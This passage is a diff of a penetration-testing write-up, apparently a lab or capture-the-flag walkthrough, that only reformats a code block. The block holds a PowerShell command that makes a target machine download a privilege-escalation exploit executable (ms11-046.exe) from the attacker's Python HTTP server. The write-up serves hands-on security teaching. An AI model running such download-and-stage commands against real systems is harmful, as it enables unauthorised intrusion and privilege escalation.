@@ -87,11 +87,10 @@ Then using powershell and python we can have the target download this exe from o
 
 We will use python http server to send the files and establish a connection. 
 
-<code>
+```
+    powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:8000/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"
 
-  powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.27:8000/ms11-046.exe', 'c:\Users\Public\Downloads\ms11-046.exe')"
-
-</code>
+```
 
 This command will download the exe to the target, placing it in the download folder.
 
